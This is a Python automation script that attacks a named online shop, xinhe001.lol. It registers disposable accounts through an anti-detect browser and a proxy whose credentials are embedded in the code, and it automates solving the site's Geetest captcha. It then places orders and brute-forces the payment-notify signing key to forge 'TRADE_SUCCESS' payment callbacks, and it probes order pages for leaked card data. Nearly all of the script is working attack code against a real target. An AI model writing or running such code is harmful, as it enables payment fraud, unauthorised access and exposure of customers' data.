#!/usr/bin/env python3
"""xinhe001 Camoufox + Qingguo tunnel: register, login, pay chain, notify probe."""
from __future__ import annotations

import hashlib
import json
import os
import random
import re
import string
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

from camoufox.sync_api import Camoufox

BASE = "https://xinhe001.lol/shop/"
OUT = Path(
    os.environ.get(
        "XINHE_OUT",
        f"/data/automation/results/xinhe001.lol/camoufox_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
    )
)
OUT.mkdir(parents=True, exist_ok=True)

QG_TUNNEL = os.environ.get(
    "QG_TUNNEL",
    "http://15E27ADA-A-JP-T-300-S-xhcfox:661C21F2CC15@overseas-us.tunnel.qg.net:16538",
)

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT = re.compile(r"var hashsalt=(.+?);")


def log(msg: str) -> None:
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def parse_proxy(url: str) -> dict:
    u = urlparse(url)
    server = f"{u.scheme}://{u.hostname}:{u.port}"
    proxy = {"server": server}
    if u.username:
        proxy["username"] = u.username
    if u.password:
        proxy["password"] = u.password
    return proxy


def rand_user() -> str:
    return "xh" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def compute_hashsalt(expr: str) -> str:
    expr = expr.strip()
    if not expr:
        return ""
    proc = subprocess.run(
        ["node", "-e", f"console.log({expr})"],
        capture_output=True,
        text=True,
        timeout=12,
    )
    return proc.stdout.strip() if proc.returncode == 0 else ""


def epay_sign(params: dict, key: str) -> str:
    items = sorted(k for k in params if k != "sign" and params[k] != "")
    s = "&".join(f"{k}={params[k]}" for k in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def leak(text: str) -> bool:
    return (
        SHOW.search(text)
        or "kminfo" in text
        or ("----" in text and ("COM" in text or "sms" in text.lower()))
    )


def captcha_ready(page) -> bool:
    return page.evaluate(
        """() => {
            const f = document.querySelector('#captchaform');
            if (!f) return false;
            const names = ['geetest_challenge','geetest_validate','geetest_seccode','token','code'];
            for (const n of names) {
                const el = f.querySelector(`input[name="${n}"]`) || document.querySelector(`input[name="${n}"]`);
                if (el && el.value) return true;
            }
            return false;
        }"""
    )


CAPTCHA_URL = BASE + "ajax.php?act=captcha"


def try_geetest(page, timeout_s: int = 60) -> bool:
    """Load Geetest via correct /shop/ajax.php captcha API, then solve widget."""
    try:
        page.wait_for_selector("#captcha", timeout=20000)
    except Exception:
        log("captcha container missing")

    cap = page.evaluate(
        """async (url) => {
            const r = await fetch(url + '&t=' + Date.now(), {credentials:'include'});
            return await r.text();
        }""",
        CAPTCHA_URL,
    )
    log(f"captcha api {cap[:150]}")

    # force init if widget stuck on "loading"
    if '"success":1' in cap or '"gt"' in cap:
        page.evaluate(
            """async (url) => {
                const r = await fetch(url + '&t=' + Date.now(), {credentials:'include'});
                const data = await r.json();
                if (!data.gt) return 'no_gt';
                await new Promise((res, rej) => {
                    const s = document.createElement('script');
                    s.src = 'https://static.geetest.com/static/tools/gt.js';
                    s.onload = res;
                    s.onerror = rej;
                    document.head.appendChild(s);
                });
                return await new Promise((resolve) => {
                    initGeetest({
                        gt: data.gt,
                        challenge: data.challenge,
                        new_captcha: data.new_captcha,
                        product: 'popup',
                        width: '100%',
                        offline: !data.success
                    }, (captchaObj) => {
                        captchaObj.appendTo('#captcha');
                        captchaObj.onReady(() => {
                            const t = document.getElementById('captcha_text');
                            const w = document.getElementById('captcha_wait');
                            if (t) t.style.display = 'none';
                            if (w) w.style.display = 'none';
                        });
                        captchaObj.onSuccess(() => {
                            const result = captchaObj.getValidate();
                            if (!result) return;
                            const f = document.getElementById('captchaform');
                            if (f) {
                                f.innerHTML =
                                  '<input type="hidden" name="geetest_challenge" value="'+result.geetest_challenge+'" />'+
                                  '<input type="hidden" name="geetest_validate" value="'+result.geetest_validate+'" />'+
                                  '<input type="hidden" name="geetest_seccode" value="'+result.geetest_seccode+'" />';
                            }
                        });
                        window.__gt = captchaObj;
                        resolve('init_ok');
                    });
                });
            }""",
            CAPTCHA_URL,
        )
        log("geetest manual init done")
        time.sleep(3)

    for sel in [".geetest_radar_tip", ".geetest_btn", ".geetest_logo", ".geetest_holder"]:
        try:
            el = page.query_selector(sel)
            if el and el.is_visible():
                el.click(timeout=3000)
                log(f"geetest click {sel}")
                time.sleep(2)
        except Exception:
            pass
    try:
        btn = page.query_selector(".geetest_slider_button")
        track = page.query_selector(".geetest_slider_track")
        if btn and track and btn.is_visible():
            box = track.bounding_box()
            if box:
                page.mouse.move(box["x"] + 8, box["y"] + box["height"] / 2)
                page.mouse.down()
                page.mouse.move(box["x"] + box["width"] * 0.85, box["y"] + box["height"] / 2, steps=35)
                page.mouse.up()
                log("geetest slider drag")
                time.sleep(2)
    except Exception as e:
        log(f"slider err {e}")

    for i in range(timeout_s // 2):
        time.sleep(2)
        if captcha_ready(page):
            log("captcha fields ready")
            return True
        if i % 5 == 0:
            log(f"geetest wait {i*2}s")
    return False


def save_cookies(context, name: str) -> None:
    cookies = context.cookies()
    (OUT / name).write_text(json.dumps(cookies, ensure_ascii=False, indent=2))


def main() -> None:
    user = rand_user()
    pwd = "Xh" + "".join(random.choices(string.digits, k=8)) + "a1"
    qq = str(random.randint(100000000, 9999999999))
    report: dict = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "user": user,
        "pwd": pwd,
        "proxy": QG_TUNNEL[:60] + "...",
        "card_leak": False,
    }

    proxy = parse_proxy(QG_TUNNEL)
    log(f"start user={user} proxy={proxy['server']}")

    try:
        with Camoufox(
            headless="virtual",
            humanize=True,
            os="windows",
            geoip=True,
            proxy=proxy,
        ) as browser:
            context = browser.new_context(
                locale="zh-CN",
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            page = context.new_page()

            # 1) Home + getcount
            page.goto(BASE, wait_until="domcontentloaded", timeout=120000)
            time.sleep(4)
            save_cookies(context, "cookies_home.json")
            home_html = page.content()
            report["home_len"] = len(home_html)
            log(f"home len={len(home_html)}")

            gc = page.evaluate(
                """async () => {
                    const r = await fetch('ajax.php?act=getcount', {credentials:'include'});
                    return await r.text();
                }"""
            )
            report["getcount"] = gc[:300]
            log(f"getcount {gc[:120]}")

            # 2) Register
            page.goto(BASE + "user/reg.php", wait_until="domcontentloaded", timeout=120000)
            time.sleep(5)
            reg_html = page.content()
            report["reg_len"] = len(reg_html)

            page.fill("input[name='user']", user)
            page.fill("input[name='pwd']", pwd)
            page.fill("input[name='qq']", qq)
            log("reg form filled")

            captcha_ok = try_geetest(page, timeout_s=45)
            report["captcha_ok"] = captcha_ok

            if captcha_ok:
                page.click("#submit_reg", timeout=10000)
                time.sleep(6)
                reg_body = page.content()
                (OUT / "reg_after.html").write_text(reg_body[:50000], encoding="utf-8")
                report["reg_url"] = page.url
                # check ajax reg response via re-submit in page
                reg_api = page.evaluate(
                    """async (args) => {
                        const fd = new FormData();
                        for (const [k,v] of Object.entries(args.data)) fd.append(k,v);
                        const f = document.querySelector('#captchaform');
                        if (f) f.querySelectorAll('input').forEach(i => fd.append(i.name, i.value));
                        const r = await fetch('ajax.php?act=reguser', {method:'POST', body:fd, credentials:'include'});
                        return await r.text();
                    }""",
                    {
                        "data": {
                            "user": user,
                            "pwd": pwd,
                            "qq": qq,
                            "hashsalt": compute_hashsalt(
                                HASHSALT.search(reg_html).group(1)
                                if HASHSALT.search(reg_html)
                                else ""
                            ),
                        }
                    },
                )
                report["reg_api"] = reg_api[:300]
                log(f"reg_api {reg_api[:150]}")
            else:
                log("captcha not solved, skip reg")
                page.screenshot(path=str(OUT / "reg_captcha_fail.png"), full_page=True)

            save_cookies(context, "cookies_reg.json")

            # 3) Login (works after reg or standalone)
            page.goto(BASE + "user/login.php", wait_until="domcontentloaded", timeout=120000)
            time.sleep(4)
            try:
                page.fill("input[name='user']", user)
                page.fill("input[name='pass'], input[name='pwd']", pwd)
                if try_geetest(page, timeout_s=30):
                    page.click("button[type='submit'], #submit_login, .button-primary", timeout=8000)
                    time.sleep(5)
                login_api = page.evaluate(
                    """async (args) => {
                        const fd = new FormData();
                        fd.append('user', args.user);
                        fd.append('pwd', args.pwd);
                        const f = document.querySelector('#captchaform');
                        if (f) f.querySelectorAll('input').forEach(i => fd.append(i.name, i.value));
                        const r = await fetch('ajax.php?act=login', {method:'POST', body:fd, credentials:'include'});
                        return await r.text();
                    }""",
                    {"user": user, "pwd": pwd},
                )
                report["login_api"] = login_api[:300]
                log(f"login_api {login_api[:150]}")
            except Exception as e:
                report["login_err"] = str(e)[:120]
            save_cookies(context, "cookies_login.json")
            report["login_url"] = page.url
            log(f"after login url={page.url}")

            # 4) Buy page — pick tid=34 cid=4 (known from recon)
            tid, cid = "34", "4"
            page.goto(
                f"{BASE}?mod=buy&cid={cid}&tid={tid}",
                wait_until="domcontentloaded",
                timeout=120000,
            )
            time.sleep(4)
            buy_html = page.content()
            (OUT / "buy.html").write_text(buy_html[:80000], encoding="utf-8")
            hs_m = HASHSALT.search(buy_html)
            hashsalt = compute_hashsalt(hs_m.group(1)) if hs_m else ""
            csrf_m = CSRF.search(buy_html)
            csrf = csrf_m.group(1) if csrf_m else ""
            report["hashsalt"] = hashsalt[:40]
            report["buy_csrf"] = csrf[:24]

            # fill inputvalue if present
            try:
                if page.query_selector("#inputvalue"):
                    page.fill("#inputvalue", "123456789")
            except Exception:
                pass

            pay_json = page.evaluate(
                """async (args) => {
                    const fd = new FormData();
                    fd.append('tid', args.tid);
                    fd.append('inputvalue', args.inputvalue);
                    fd.append('num', '1');
                    fd.append('hashsalt', args.hashsalt);
                    fd.append('csrf_token', args.csrf);
                    const r = await fetch('ajax.php?act=pay', {
                        method: 'POST', body: fd, credentials: 'include'
                    });
                    return await r.text();
                }""",
                {
                    "tid": tid,
                    "inputvalue": "123456789",
                    "hashsalt": hashsalt,
                    "csrf": csrf,
                },
            )
            report["pay_resp"] = pay_json[:500]
            log(f"pay {pay_json[:200]}")

            trade_no = None
            try:
                pj = json.loads(pay_json)
                trade_no = pj.get("trade_no")
                report["pay_json"] = pj
            except Exception:
                pass

            if trade_no:
                page.goto(
                    f"{BASE}?mod=order&orderid={trade_no}",
                    wait_until="domcontentloaded",
                    timeout=60000,
                )
                time.sleep(3)
                order_html = page.content()
                (OUT / "order.html").write_text(order_html[:50000], encoding="utf-8")
                report["order_kminfo"] = "kminfo" in order_html
                report["order_show"] = SHOW.findall(order_html)[:3]
                if leak(order_html):
                    report["card_leak"] = True
                    log("ORDER LEAK")

                # epay notify brute
                notify_hits = []
                keys = [
                    "123456", "888888", "xinhe", "xinghe001", "xinhe001",
                    "faka", "rainbow", "epay", "mapi", "admin", "12345678",
                ]
                for key in keys:
                    params = {
                        "pid": "1000",
                        "type": "qqpay",
                        "out_trade_no": trade_no,
                        "notify_url": BASE + "other/epay_notify.php",
                        "return_url": BASE + "other/return.php",
                        "name": "test",
                        "money": "5.00",
                        "trade_no": trade_no,
                        "trade_status": "TRADE_SUCCESS",
                    }
                    params["sign"] = epay_sign(params, key)
                    params["sign_type"] = "MD5"
                    body = page.evaluate(
                        """async (args) => {
                            const fd = new FormData();
                            for (const [k,v] of Object.entries(args.params)) fd.append(k,v);
                            const r = await fetch(args.url, {method:'POST', body:fd, credentials:'include'});
                            return await r.text();
                        }""",
                        {"url": BASE + "other/epay_notify.php", "params": params},
                    )
                    if body and body.strip() not in ("error", "fail", "FAIL", ""):
                        notify_hits.append({"key": key, "body": body[:200]})
                        log(f"notify hit key={key} {body[:80]}")
                report["notify_hits"] = notify_hits

            # 5) Surface recheck logged-in
            page.goto(f"{BASE}?mod=query&data=1", wait_until="domcontentloaded", timeout=60000)
            time.sleep(2)
            q_html = page.content()
            so = SHOW.findall(q_html)
            report["query_data1_showOrder"] = len(so)
            if so:
                report["card_leak"] = True
                report["query_sample"] = so[:5]

            save_cookies(context, "cookies_final.json")

    except Exception as e:
        report["error"] = str(e)[:500]
        log(f"FATAL {e}")

    report["CARD_LEAK"] = report.get("card_leak", False)
    (OUT / "report.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log(f"DONE CARD_LEAK={report['CARD_LEAK']} out={OUT}")
    print(json.dumps(report, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
